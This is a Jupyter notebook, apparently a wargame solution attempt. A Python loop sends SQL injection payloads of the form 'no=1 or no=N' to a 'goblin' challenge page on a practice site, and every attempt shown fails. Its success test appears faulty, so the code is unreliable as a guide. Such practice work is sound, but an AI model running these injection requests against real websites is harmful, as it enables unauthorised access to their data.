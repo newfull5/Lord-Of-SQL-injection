{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0 is not Correct\n",
      "1 is not Correct\n",
      "2 is not Correct\n",
      "3 is not Correct\n",
      "4 is not Correct\n",
      "5 is not Correct\n",
      "6 is not Correct\n",
      "7 is not Correct\n",
      "8 is not Correct\n",
      "9 is not Correct\n",
      "10 is not Correct\n",
      "11 is not Correct\n",
      "12 is not Correct\n",
      "13 is not Correct\n",
      "14 is not Correct\n",
      "15 is not Correct\n",
      "16 is not Correct\n",
      "17 is not Correct\n",
      "18 is not Correct\n",
      "19 is not Correct\n",
      "20 is not Correct\n",
      "21 is not Correct\n",
      "22 is not Correct\n",
      "23 is not Correct\n",
      "24 is not Correct\n",
      "25 is not Correct\n",
      "26 is not Correct\n",
      "27 is not Correct\n",
      "28 is not Correct\n",
      "29 is not Correct\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "url = \"https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php\"\n",
    "\n",
    "for i in range(0,30):\n",
    "    query = \"?no=1 or no={}\".format(i)\n",
    "    req = requests.get(url+query)\n",
    "    if req.text.find(\"Clear\") == 1:\n",
    "        print(\"[+] {} is Correct [+]\".format(i))\n",
    "        break\n",
    "    else:\n",
    "        print(\"{} is not Correct\".format(i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
